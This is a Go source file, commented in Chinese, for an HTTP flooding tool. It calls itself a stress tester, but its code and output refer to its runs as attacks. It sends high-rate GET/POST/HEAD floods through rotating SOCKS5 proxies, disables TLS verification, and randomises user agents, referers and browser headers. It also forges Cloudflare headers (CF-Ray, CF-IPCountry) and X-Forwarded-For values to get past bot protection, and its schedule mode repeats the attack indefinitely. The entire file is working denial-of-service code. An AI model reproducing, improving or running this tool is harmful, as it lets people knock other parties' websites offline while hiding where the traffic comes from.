package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	fakeuseragent "github.com/EDDYCJY/fake-useragent"
	"golang.org/x/net/proxy"
)

// 配置结构
type Config struct {
	TargetURL         string
	Mode              string
	Threads           int
	RPS               int
	Duration          int
	Timeout           int
	ProxyFile         string
	CFBypass          bool
	RandomPath        bool
	RandomParams      bool
	Schedule          bool
	ScheduleInterval  int // 分钟
	ScheduleDuration  int // 分钟
}

// 统计信息
type Stats struct {
	TotalRequests   int64
	SuccessfulReqs  int64
	FailedReqs      int64
	CurrentRPS      float64
	AvgRPS          float64
	StartTime       time.Time
	LastStatsTime   time.Time
	LastTotalReqs   int64
	mu              sync.RWMutex
}

var stats = &Stats{
	StartTime:     time.Now(),
	LastStatsTime: time.Now(),
}

// 代理列表
var proxies []string

func main() {
	rand.Seed(time.Now().UnixNano())

	// 解析命令行参数
	config := parseArgs()

	// 加载代理
	loadProxies(config.ProxyFile)

	fmt.Printf("🚀 高级压力测试工具 - CF绕过版\n")
	fmt.Printf("目标: %s\n", config.TargetURL)
	fmt.Printf("模式: %s\n", config.Mode)
	fmt.Printf("线程: %d\n", config.Threads)
	fmt.Printf("RPS: %d\n", config.RPS)
	fmt.Printf("时长: %d秒\n", config.Duration)
	if len(proxies) > 0 {
		fmt.Printf("代理数: %d (SOCKS5代理模式)\n", len(proxies))
	} else {
		fmt.Printf("代理数: 0 (直连模式)\n")
	}
	fmt.Printf("CF绕过: %v\n", config.CFBypass)
	if config.Schedule {
		fmt.Printf("定时执行: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
	}

	// 启动统计协程
	go statsReporter()

	// 启动攻击
	if config.Schedule {
		startScheduledAttack(config)
	} else {
		startAttack(config)
	}
}

func parseArgs() *Config {
	config := &Config{
		TargetURL:        "https://example.com",
		Mode:             "post",
		Threads:          100,
		RPS:              1000,
		Duration:         60,
		Timeout:          10,
		ProxyFile:        "socks5.txt",
		CFBypass:         true,
		RandomPath:       false, // 已禁用，避免404错误
		RandomParams:     false, // 已禁用，不再添加随机查询参数
		Schedule:         false,
		ScheduleInterval: 10,
		ScheduleDuration: 20,
	}

	flag.StringVar(&config.TargetURL, "url", config.TargetURL, "目标URL")
	flag.StringVar(&config.Mode, "mode", config.Mode, "攻击模式 (get/post/head)")
	flag.IntVar(&config.Threads, "threads", config.Threads, "线程数")
	flag.IntVar(&config.RPS, "rps", config.RPS, "每秒请求数")
	flag.IntVar(&config.Duration, "duration", config.Duration, "持续时间(秒)")
	flag.IntVar(&config.Timeout, "timeout", config.Timeout, "超时时间(秒)")
	flag.StringVar(&config.ProxyFile, "proxy-file", config.ProxyFile, "SOCKS5代理文件")
	flag.BoolVar(&config.CFBypass, "cf-bypass", config.CFBypass, "启用CF绕过")
	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数（已禁用，仅对文件路径添加随机数）")
	flag.BoolVar(&config.Schedule, "schedule", config.Schedule, "启用定时执行")
	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
	flag.Parse()

	// 基本校验
	if strings.TrimSpace(config.TargetURL) == "" {
		fmt.Printf("❌ 错误: 目标URL为空\n")
		os.Exit(1)
	}

	// 如果还传了位置参数且必要，可处理（保持向后兼容）
	args := flag.Args()
	if len(args) >= 4 && config.TargetURL == "" {
		config.Mode = args[0]
		config.TargetURL = args[1]
		if t, err := strconv.Atoi(args[2]); err == nil {
			config.Threads = t
		}
		if r, err := strconv.Atoi(args[3]); err == nil {
			config.RPS = r
		}
	}

	return config
}

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("⚠️  无法加载代理文件 %s: %v\n", filename, err)
		fmt.Printf("将使用直连模式\n")
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}

	if len(proxies) == 0 {
		fmt.Printf("⚠️  代理文件为空，将使用直连模式\n")
	} else {
		fmt.Printf("✅ 加载了 %d 个SOCKS5代理\n", len(proxies))
	}
}

func startAttack(config *Config) {
	// 防止 RPS 为 0 导致 panic
	if config.RPS <= 0 {
		fmt.Printf("❌ 错误: RPS 必须大于 0\n")
		return
	}

	interval := time.Second / time.Duration(config.RPS)
	if interval <= 0 {
		interval = time.Nanosecond // 最小间隔防止panic，但通常不会到这里
	}
	rateLimiter := time.NewTicker(interval)
	defer rateLimiter.Stop()

	done := make(chan struct{})
	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(config, rateLimiter.C, done)
		}()
	}

	time.Sleep(time.Duration(config.Duration) * time.Second)

	fmt.Println("\n⏰ 攻击时间结束，等待所有请求完成...")
	close(done)
	wg.Wait()

	printFinalStats()
}

func startScheduledAttack(config *Config) {
	if config.ScheduleInterval <= 0 {
		fmt.Printf("❌ 错误: schedule-interval 必须大于 0\n")
		return
	}
	fmt.Println("🕐 启动定时攻击模式...")
	ticker := time.NewTicker(time.Duration(config.ScheduleInterval) * time.Minute)
	defer ticker.Stop()

	for {
		fmt.Printf("🚀 开始攻击（%d 分钟）...\n", config.ScheduleDuration)
		executeAttack(config, config.ScheduleDuration)
		fmt.Printf("💤 等待 %d 分钟后开始下一轮...\n", config.ScheduleInterval)
		<-ticker.C
	}
}

func executeAttack(config *Config, durationMinutes int) {
	if config.RPS <= 0 {
		fmt.Printf("❌ 错误: RPS 必须大于 0\n")
		return
	}
	interval := time.Second / time.Duration(config.RPS)
	if interval <= 0 {
		interval = time.Nanosecond
	}
	rateLimiter := time.NewTicker(interval)
	defer rateLimiter.Stop()

	done := make(chan struct{})
	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(config, rateLimiter.C, done)
		}()
	}

	duration := time.Duration(durationMinutes) * time.Minute
	fmt.Printf("⏰ 攻击将持续 %d 分钟...\n", durationMinutes)
	time.Sleep(duration)

	fmt.Printf("⏰ 本轮攻击结束，等待所有请求完成...\n")
	close(done)
	wg.Wait()

	printFinalStats()
	fmt.Printf("✅ 本轮攻击完成\n")
}

func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
	for {
		select {
		case <-rateLimit:
			success := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			if success {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		case <-done:
			return
		}
	}
}

func performAttack(config *Config) bool {
	if config.TargetURL == "" {
		return false
	}

	baseURL, err := url.Parse(config.TargetURL)
	if err != nil {
		fmt.Printf("❌ URL解析失败: %s, 错误: %v\n", config.TargetURL, err)
		return false
	}

	var client *http.Client
	var useProxy bool
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		client = createSOCKS5Client(px, config.Timeout)
		useProxy = true
	} else {
		client = createDirectClient(config.Timeout)
		useProxy = false
	}

	finalURL := buildFinalURL(baseURL, config)

	var req *http.Request
	switch strings.ToLower(config.Mode) {
	case "get":
		req, err = http.NewRequest("GET", finalURL, nil)
	case "post":
		req, err = http.NewRequest("POST", finalURL, strings.NewReader("{}"))
	case "head":
		req, err = http.NewRequest("HEAD", finalURL, nil)
	default:
		req, err = http.NewRequest("GET", finalURL, nil)
	}
	if err != nil {
		return false
	}

	setAdvancedHeaders(req, config)

	resp, err := client.Do(req)
	if err != nil {
		// 如果使用代理失败，尝试直连
		if useProxy {
			fmt.Printf("🔄 代理失败，尝试直连: %v\n", err)
			client = createDirectClient(config.Timeout)
			resp, err = client.Do(req)
		}
		if err != nil {
			if strings.Contains(err.Error(), "timeout") {
				fmt.Printf("⏰ 请求超时: %v\n", err)
			} else if strings.Contains(err.Error(), "connection refused") {
				fmt.Printf("🚫 连接被拒绝: %v\n", err)
			} else if strings.Contains(err.Error(), "no route to host") {
				fmt.Printf("🛣️  无路由到主机: %v\n", err)
			} else if strings.Contains(err.Error(), "no acceptable authentication methods") {
				fmt.Printf("🔐 代理认证失败: %v\n", err)
			} else {
				fmt.Printf("❌ 请求失败: %v\n", err)
			}
			return false
		}
	}
	defer func() {
		if resp != nil && resp.Body != nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}()

	if resp == nil {
		return false
	}

	if resp.StatusCode >= 500 {
		fmt.Printf("🔥 服务器错误: %d\n", resp.StatusCode)
	} else if resp.StatusCode >= 400 {
		fmt.Printf("⚠️  客户端错误: %d\n", resp.StatusCode)
	} else {
		fmt.Printf("✅ 请求成功: %d\n", resp.StatusCode)
	}

	// 统计已在worker中处理，这里不需要重复计算

	return resp.StatusCode < 500
}

func createSOCKS5Client(proxyAddr string, timeout int) *http.Client {
	// 支持两种代理行格式：host:port 或 socks5://host:port
	parsed := proxyAddr
	if strings.HasPrefix(proxyAddr, "socks5://") {
		parsed = strings.TrimPrefix(proxyAddr, "socks5://")
	}
	// x/net/proxy 的 SOCKS5 dialer
	dialer, err := proxy.SOCKS5("tcp", parsed, nil, proxy.Direct)
	if err != nil {
		// 无法创建 socks5 dialer -> 回退直连
		return createDirectClient(timeout)
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives:   true,
		MaxIdleConns:        0,
		MaxIdleConnsPerHost: 0,
		IdleConnTimeout:     0,
	}

	// 将无上下文 dialer 包装为 DialContext
	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		// dialer.Dial 没有 context，所以忽略 ctx
		return dialer.Dial(network, addr)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}
}

func createDirectClient(timeout int) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives:   true,
		MaxIdleConns:        0,
		MaxIdleConnsPerHost: 0,
		IdleConnTimeout:     0,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}
}

func buildFinalURL(baseURL *url.URL, config *Config) string {
	finalURL := *baseURL

	if config.RandomPath {
		finalURL.Path = generateRandomPathForFile(finalURL.Path)
	}

	// 不再添加随机查询参数，只对文件路径添加随机数
	// if config.RandomParams {
	//	finalURL.RawQuery = generateRandomParams()
	// }

	return finalURL.String()
}

func setAdvancedHeaders(req *http.Request, config *Config) {
	userAgent := fakeuseragent.Random()
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Referer", generateRandomReferer())
	
	// 为 POST 请求设置 Content-Type
	if strings.ToLower(config.Mode) == "post" {
		req.Header.Set("Content-Type", "application/json")
	}
	
	generateRandomHeaders(req, config)

	if config.CFBypass {
		req.Header.Set("CF-IPCountry", "US")
		req.Header.Set("CF-Ray", generateCFRay())
		req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	}
}

func generateCFRay() string {
	chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func generateRandomPathForFile(originalPath string) string {
	if originalPath == "" {
		originalPath = "/"
	}
	if strings.Contains(originalPath, ".") && !strings.HasSuffix(originalPath, "/") {
		lastDot := strings.LastIndex(originalPath, ".")
		if lastDot > 0 {
			baseName := originalPath[:lastDot]
			extension := originalPath[lastDot:]
			randomNum := rand.Intn(10000)
			return fmt.Sprintf("%s_%d%s", baseName, randomNum, extension)
		}
	}
	randomNum := rand.Intn(10000)
	if originalPath == "/" {
		return fmt.Sprintf("/%d", randomNum)
	}
	return fmt.Sprintf("%s/%d", originalPath, randomNum)
}

func generateRandomParams() string {
	params := []string{
		"t=" + strconv.FormatInt(time.Now().Unix(), 10),
		"_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"v=" + strconv.Itoa(rand.Intn(100)),
		"ref=" + []string{"google", "bing", "yahoo", "direct"}[rand.Intn(4)],
		"utm_source=" + []string{"google", "facebook", "twitter", "email"}[rand.Intn(4)],
		"utm_medium=" + []string{"cpc", "cpm", "organic", "social"}[rand.Intn(4)],
		"utm_campaign=" + generateRandomString(8),
		"session_id=" + generateRandomString(32),
		"user_id=" + strconv.Itoa(rand.Intn(10000)),
		"page=" + strconv.Itoa(rand.Intn(100)),
	}

	numParams := rand.Intn(5) + 3
	selected := make([]string, 0, numParams)
	for i := 0; i < numParams; i++ {
		selected = append(selected, params[rand.Intn(len(params))])
	}
	return strings.Join(selected, "&")
}

func generateRandomString(length int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func generateRandomReferer() string {
	domains := []string{
		"google.com", "bing.com", "yahoo.com", "duckduckgo.com",
		"baidu.com", "sogou.com", "so.com", "360.cn",
		"facebook.com", "twitter.com", "instagram.com", "youtube.com",
		"reddit.com", "github.com", "stackoverflow.com", "amazon.com",
	}
	paths := []string{"/", "/search?q=", "/home", "/about", "/contact", "/blog", "/news", "/api"}
	domain := domains[rand.Intn(len(domains))]
	path := paths[rand.Intn(len(paths))]
	// 随机添加查询参数
	if strings.Contains(path, "?") {
		paramKey := []string{"q", "search", "s"}[rand.Intn(3)]
		path += paramKey + "=" + generateRandomString(6+rand.Intn(8))
	}
	if rand.Float32() < 0.3 {
		path += "&utm=" + generateRandomString(6)
	}
	return "https://www." + domain + path
}

func generateRandomHeaders(req *http.Request, config *Config) {
	headerCount := rand.Intn(11) + 5
	selected := make(map[string]bool)

	headerTypes := []string{
		"Accept", "Accept-Language", "Accept-Encoding", "Cache-Control", "Connection",
		"Upgrade-Insecure-Requests", "Sec-Fetch-Dest", "Sec-Fetch-Mode", "Sec-Fetch-Site", "Sec-Fetch-User",
	}
	for i := 0; i < headerCount; i++ {
		ht := headerTypes[rand.Intn(len(headerTypes))]
		selected[ht] = true
	}

	accepts := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}
	languages := []string{"en-US,en;q=0.9", "zh-CN,zh;q=0.9,en;q=0.8", "en-GB,en;q=0.9"}
	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip"}
	cacheControls := []string{"no-cache", "max-age=0", "no-store, no-cache, must-revalidate"}

	if selected["Accept"] {
		req.Header.Set("Accept", accepts[rand.Intn(len(accepts))])
	}
	if selected["Accept-Language"] {
		req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	}
	if selected["Accept-Encoding"] {
		req.Header.Set("Accept-Encoding", encodings[rand.Intn(len(encodings))])
	}
	if selected["Cache-Control"] {
		req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	}

	if rand.Float32() < 0.7 {
		req.Header.Set("Pragma", "no-cache")
	}
	chromeVersions := []string{"120", "119", "121", "118", "117"}
	version := chromeVersions[rand.Intn(len(chromeVersions))]
	req.Header.Set("Sec-Ch-Ua", fmt.Sprintf("\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"%s\", \"Google Chrome\";v=\"%s\"", version, version))
	req.Header.Set("Sec-Ch-Ua-Mobile", []string{"?0", "?1"}[rand.Intn(2)])
	platforms := []string{"Windows", "macOS", "Linux", "Android", "iOS"}
	req.Header.Set("Sec-Ch-Ua-Platform", fmt.Sprintf("\"%s\"", platforms[rand.Intn(len(platforms))]))

	secFetchDests := []string{"document", "empty", "image", "script"}
	req.Header.Set("Sec-Fetch-Dest", secFetchDests[rand.Intn(len(secFetchDests))])
	secFetchModes := []string{"navigate", "cors", "no-cors", "same-origin"}
	req.Header.Set("Sec-Fetch-Mode", secFetchModes[rand.Intn(len(secFetchModes))])
	secFetchSites := []string{"none", "same-origin", "cross-site"}
	req.Header.Set("Sec-Fetch-Site", secFetchSites[rand.Intn(len(secFetchSites))])
	req.Header.Set("Sec-Fetch-User", []string{"?1", "?0"}[rand.Intn(2)])

	if rand.Float32() < 0.8 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	if rand.Float32() < 0.6 {
		req.Header.Set("DNT", []string{"1", "0"}[rand.Intn(2)])
	}
	req.Header.Set("Connection", []string{"keep-alive", "close"}[rand.Intn(2)])

	extraHeaders := []string{
		"X-Requested-With", "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Proto",
		"X-Request-ID", "X-Correlation-ID", "X-Client-IP", "X-Remote-IP",
	}
	for i := 0; i < rand.Intn(5); i++ {
		h := extraHeaders[rand.Intn(len(extraHeaders))]
		if !selected[h] {
			req.Header.Set(h, generateRandomString(8+rand.Intn(12)))
			selected[h] = true
		}
	}
}

func statsReporter() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		stats.mu.Lock()
		now := time.Now()

		timeDiff := now.Sub(stats.LastStatsTime).Seconds()
		if timeDiff >= 0.0001 {
			currentRPS := float64(stats.TotalRequests-stats.LastTotalReqs) / timeDiff
			stats.CurrentRPS = currentRPS
			stats.LastTotalReqs = stats.TotalRequests
			stats.LastStatsTime = now
		}

		uptime := now.Sub(stats.StartTime).Seconds()
		if uptime > 0 {
			stats.AvgRPS = float64(stats.TotalRequests) / uptime
		}

		fmt.Printf("\r📊 总请求: %d | 成功: %d | 失败: %d | 当前RPS: %.2f | 平均RPS: %.2f | 运行时间: %.1fs\n",
			stats.TotalRequests, stats.SuccessfulReqs, stats.FailedReqs,
			stats.CurrentRPS, stats.AvgRPS, uptime)

		statsJSON := map[string]interface{}{
			"total_requests":      stats.TotalRequests,
			"successful_requests": stats.SuccessfulReqs,
			"failed_requests":     stats.FailedReqs,
			"current_rps":         stats.CurrentRPS,
			"avg_rps":             stats.AvgRPS,
			"uptime":              uptime,
		}
		jsonData, _ := json.Marshal(statsJSON)
		fmt.Printf("STATS_JSON:%s\n", string(jsonData))

		stats.mu.Unlock()
	}
}

func printFinalStats() {
	stats.mu.RLock()
	defer stats.mu.RUnlock()

	uptime := time.Since(stats.StartTime).Seconds()
	total := stats.TotalRequests
	success := stats.SuccessfulReqs
	fail := stats.FailedReqs
	avgRPS := stats.AvgRPS

	fmt.Printf("\n\n🎯 攻击完成！\n")
	fmt.Printf("总请求数: %d\n", total)
	fmt.Printf("成功请求: %d\n", success)
	fmt.Printf("失败请求: %d\n", fail)
	if total > 0 {
		fmt.Printf("成功率: %.2f%%\n", float64(success)/float64(total)*100)
	} else {
		fmt.Printf("成功率: N/A (没有请求)\n")
	}
	fmt.Printf("平均RPS: %.2f\n", avgRPS)
	fmt.Printf("运行时间: %.2f秒\n", uptime)
}
